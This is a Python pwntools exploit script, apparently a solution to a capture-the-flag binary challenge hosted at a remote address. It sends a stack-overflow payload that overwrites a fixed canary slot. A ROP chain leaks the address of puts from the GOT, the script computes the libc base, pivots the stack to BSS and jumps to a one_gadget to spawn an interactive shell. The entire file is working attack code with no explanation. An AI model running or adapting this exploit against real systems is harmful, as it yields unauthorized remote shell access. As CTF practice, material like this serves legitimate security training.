#coding=utf-8
from pwn import *
from time import sleep
context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = 'chuj.top'
port = '35167'
reomote_addr = [ip,port]
binary = './a.out'

libc = ELF('./libc-2.31.so')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7e')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base

pop_rdi_ret = 0x0000000000401363
pop_rs1_r15_ret = 0x0000000000401361
ret = 0x000000000040101a
main = 0x000000004010F0
bss = 0x0000000000404060 + 0x200


# attach(p,'b *0x0000000000401240')
canary = 'a'*0x8


payload = 'a'*0x28 + canary + p64(bss)
payload += p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts'])
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rs1_r15_ret) + p64(bss) + p64(0)
payload += p64(elf.plt['read']) + p64(0x00000000040125A)

pause()
sl(payload.ljust(0x870,'a'))
pause()
puts = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
print "puts=>"+hex(puts)

libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
shell = 0xe6c7e + libc_base
print "libc_base=>"+hex(libc_base)

sleep(2)
# attach(p,'b *0x0000000000401240')
payload = p64(bss) + p64(ret) + p64(shell)# + p64(ret) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)

pause()
sl(payload.ljust(0x870,'a'))
pause()
it()